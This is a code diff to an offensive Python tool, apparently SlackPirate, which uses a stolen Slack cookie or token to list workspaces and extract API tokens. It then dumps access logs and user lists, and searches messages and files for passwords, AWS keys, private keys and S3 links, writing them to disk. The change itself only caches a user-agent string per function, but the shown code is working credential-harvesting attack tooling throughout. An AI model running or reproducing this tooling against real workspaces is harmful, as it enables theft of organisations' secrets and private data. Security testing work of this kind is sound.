@@ -8,7 +8,7 @@ import time
 import colorama
 import requests
 import termcolor
-from constants import *
+from constants import getUserAgent
 
 colorama.init()  # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
 
@@ -86,12 +86,13 @@ def is_cookie_flag_set():
 
     if args.cookie:
         try:
-            r = requests.get("https://slackpirate.slack.com", cookies=d_cookie, headers=getUserAgent())
+            current_user_agent = getUserAgent()
+            r = requests.get("https://slackpirate.slack.com", cookies=d_cookie, headers=current_user_agent)
             already_signed_in_match = re.findall(already_signed_in_team_regex, str(r.content))
             if already_signed_in_match:
                 print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
                 for workspace in already_signed_in_match:
-                    r = requests.get(workspace, cookies=d_cookie, headers=getUserAgent())
+                    r = requests.get(workspace, cookies=d_cookie, headers=current_user_agent)
                     regex_tokens = re.findall(slack_api_token_regex, str(r.content))
                     for slack_token in regex_tokens:
                         print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
@@ -110,9 +111,10 @@ def check_token_validity():
     global output_directory
     global slack_workspace
     try:
+        current_user_agent = getUserAgent()
         r = requests.post(
             "https://slack.com/api/auth.test?token=" + token + "&pretty=1",
-            headers={'Authorization': 'Bearer ' + token}).json()
+            headers={'Authorization': 'Bearer ' + token, 'User-Agent': current_user_agent}).json()
         if str(r['ok']) == 'True':
             output_directory = str(r['team'])
             slack_workspace = str(r['url'])
@@ -134,7 +136,8 @@ def print_interesting_information():
     # I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access
 
     try:
-        r = requests.get(slack_workspace, headers={'User-Agent': getUserAgent()})
+        current_user_agent = getUserAgent()
+        r = requests.get(slack_workspace, headers={'User-Agent': current_user_agent})
         team_domains_match = re.findall(workspace_valid_emails_regex, str(r.content))
         for domain in team_domains_match:
             print(
@@ -151,9 +154,10 @@ def dump_team_access_logs():
 
     print(termcolor.colored("START: Attempting download Workspace access logs", "white", "on_blue"))
     try:
+        current_user_agent = getUserAgent()
         r = requests.get(
             "https://slack.com/api/team.accessLogs?token=" + token + "&pretty=1&count=1000",
-            headers={'User-Agent': getUserAgent()}).json()
+            headers={'User-Agent': current_user_agent}).json()
         is_rate_limited(r)
         if str(r['ok']) == 'True':
             for value in r['logins']:
@@ -184,9 +188,10 @@ def dump_user_list():
     print(termcolor.colored("START: Attempting to download Workspace user list", "white", "on_blue"))
     pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
     try:
+        current_user_agent = getUserAgent()
         r = requests.get(
             "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=1&cursor=" + pagination_cursor,
-            headers={'User-Agent': getUserAgent()}).json()
+            headers={'User-Agent': current_user_agent}).json()
         is_rate_limited(r)
         if str(r['ok']) == 'False':
             print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
@@ -196,7 +201,7 @@ def dump_user_list():
             while str(r['ok']) == 'True' and pagination_cursor:
                 r = requests.get(
                     "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=900&cursor=" + pagination_cursor,
-                    headers={'User-Agent': getUserAgent()}).json()
+                    headers={'User-Agent': current_user_agent}).json()
                 for value in r['members']:
                     pagination_cursor = r['response_metadata']['next_cursor']
                     with open(output_directory + '/' + file_user_list, 'a', encoding="utf-8") as outfile:
@@ -214,10 +219,11 @@ def find_s3():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in s3_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
@@ -227,7 +233,7 @@ def find_s3():
                 is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 regex_results = re.findall(s3_regex, str(r))
                 with open(output_directory + '/' + file_s3, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
@@ -248,10 +254,11 @@ def find_credentials():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in credentials_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
@@ -261,7 +268,7 @@ def find_credentials():
                 is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 regex_results = re.findall(credentials_regex, str(r))
                 with open(output_directory + '/' + file_credentials, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
@@ -281,10 +288,11 @@ def find_aws_keys():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in aws_keys_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=" + query + "&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
@@ -294,7 +302,7 @@ def find_aws_keys():
                 is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=" + key + "&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 regex_results = re.findall(aws_keys_regex, str(r))
                 with open(output_directory + '/' + file_aws_keys, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
@@ -317,10 +325,11 @@ def find_private_keys():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in private_keys_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
@@ -330,7 +339,7 @@ def find_private_keys():
                 is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 regex_results = re.findall(private_keys_regex, str(r))
                 remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                 with open(output_directory + '/' + file_private_keys, 'a', encoding="utf-8") as log_output:
@@ -354,10 +363,11 @@ def find_interesting_links():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in links_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=has%3Alink%20" + query + "&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
@@ -367,7 +377,7 @@ def find_interesting_links():
                 is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=has%3Alink%20" + key + "&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 regex_results = re.findall(links_regex, str(r))
                 with open(output_directory + '/' + file_links, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
@@ -393,10 +403,11 @@ def download_interesting_files():
     pagination = {}
 
     try:
+        current_user_agent = getUserAgent()
         for query in interesting_files_queries:
             r = requests.get(
                 "https://slack.com/api/search.files?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
-                headers={'User-Agent': getUserAgent()}).json()
+                headers={'User-Agent': current_user_agent}).json()
             is_rate_limited(r)
             pagination[query] = (r['files']['pagination']['page_count'])
 
@@ -405,7 +416,7 @@ def download_interesting_files():
             while page <= value:
                 r = requests.get(
                     "https://slack.com/api/search.files?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
-                        page), headers={'User-Agent': getUserAgent()}).json()
+                        page), headers={'User-Agent': current_user_agent}).json()
                 is_rate_limited(r)
                 for file in r['files']['matches']:
                     file_name = file['name']
